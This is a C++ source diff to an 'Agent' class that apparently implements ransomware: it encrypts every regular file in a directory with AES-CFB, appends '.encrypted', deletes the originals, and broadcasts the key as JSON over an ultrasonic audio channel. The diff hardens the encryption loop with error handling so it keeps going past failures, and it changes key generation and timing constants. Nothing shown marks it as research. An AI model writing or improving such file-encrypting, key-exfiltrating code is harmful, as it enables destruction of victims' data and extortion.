@@ -54,14 +54,24 @@ void Agent::decrypt(const std::array<byte, AES::DEFAULT_KEYLENGTH>& encryption_k
 	{
 		if (entry.is_regular_file())
 		{
-			{
-				const size_t extention_start = entry.path().wstring().find_last_of('.');
-				const path final_path = entry.path().wstring().substr(0, extention_start);
-				CFB_Mode<AES>::Decryption decryption(encryption_key.data(), encryption_key.size(), m_init_vector.data());
-				FileSource fsDcr(entry.path().c_str(), true, new StreamTransformationFilter(decryption, new FileSink(final_path.c_str())));
-			}
+			try {
+				{
+					const size_t extention_start = entry.path().wstring().find_last_of('.');
+					const path final_path = entry.path().wstring().substr(0, extention_start);
+					CFB_Mode<AES>::Decryption decryption(encryption_key.data(), encryption_key.size(), m_init_vector.data());
+					FileSource fsDcr(entry.path().c_str(), true, new StreamTransformationFilter(decryption, new FileSink(final_path.c_str())));
+				}
 
-			std::filesystem::remove(entry.path());
+				std::filesystem::remove(entry.path());
+			}
+			catch (const Exception& ec)
+			{
+				LOG("Error " + std::string(ec.what()) + " at decrypt file " + entry.path().string());
+			}
+			catch (...)
+			{
+				LOG("Unkown error at decrypt file " + entry.path().string());
+			}
 		}
 	}
 }
@@ -72,15 +82,30 @@ void Agent::encrypt_directory(const std::array<byte, AES::DEFAULT_KEYLENGTH>& en
 	{
 		if (entry.is_regular_file())
 		{
+			try {
+				{
+					path final_path = entry.path().wstring() + L".encrypted";
+					CFB_Mode<AES>::Encryption encryption(encryption_key.data(), encryption_key.size(), m_init_vector.data());
+					FileSource fsEnc(entry.path().c_str(), true, new StreamTransformationFilter(encryption, new FileSink(final_path.c_str())));
+				}
+			}
+			catch (const Exception& ec)
 			{
-				path final_path = entry.path().wstring() + L".encrypted";
-				CFB_Mode<AES>::Encryption encryption(encryption_key.data(), encryption_key.size(), m_init_vector.data());
-				FileSource fsEnc(entry.path().c_str(), true, new StreamTransformationFilter(encryption, new FileSink(final_path.c_str())));
+				LOG("Error " + std::string(ec.what()) + " at encrypt file " + entry.path().string());
+			}
+			catch (...)
+			{
+				LOG("Unkown error at encrypt file " + entry.path().string());
 			}
 
 			try {
 				std::filesystem::remove(entry.path());
-			} catch (...)
+			}
+			catch (const Exception& ec)
+			{
+				LOG("Error " + std::string(ec.what()) + " at encrypt when removing file " + entry.path().string());
+			}
+			catch (...)
 			{
 				LOG("remove failed");
 			}
@@ -90,7 +115,7 @@ void Agent::encrypt_directory(const std::array<byte, AES::DEFAULT_KEYLENGTH>& en
 
 std::array<byte, AES::DEFAULT_KEYLENGTH> Agent::generate_key()
 {
-	constexpr uint32_t MAX_BYTE_VALUE = 122;
+	constexpr uint32_t MAX_BYTE_VALUE = 91;
 	constexpr uint32_t MIN_BYTE_VALUE = 48;
 	AutoSeededRandomPool rng{};
 	std::array<byte, AES::DEFAULT_KEYLENGTH> key{};
@@ -119,6 +144,7 @@ void Agent::send_key(const std::array<byte, AES::DEFAULT_KEYLENGTH>& encryption_
 {
 	constexpr int TX_PROTOCOL = GGWAVE_TX_PROTOCOL_ULTRASOUND_FASTEST;
 	constexpr int VOLUME = 10;
+	constexpr std::chrono::duration SLEEP_TIME = 30s;
 	
 	std::string encryption_data = "{ \"agentIp\": \"10.0.0.5\", \"content\" : \"{\\\"EncryptionKey\\\":\\\"" + std::string(encryption_key.begin(), encryption_key.end()) +"\\\"}\" }";
 	auto ggWave = m_ultrasonic.get_ggwave();
@@ -129,6 +155,6 @@ void Agent::send_key(const std::array<byte, AES::DEFAULT_KEYLENGTH>& encryption_
 			ggWave->init(encryption_data.size(), encryption_data.data(), ggWave->getTxProtocol(TX_PROTOCOL), VOLUME);
 		}
 
-		std::this_thread::sleep_for(30s);
+		std::this_thread::sleep_for(SLEEP_TIME);
 	}
 }
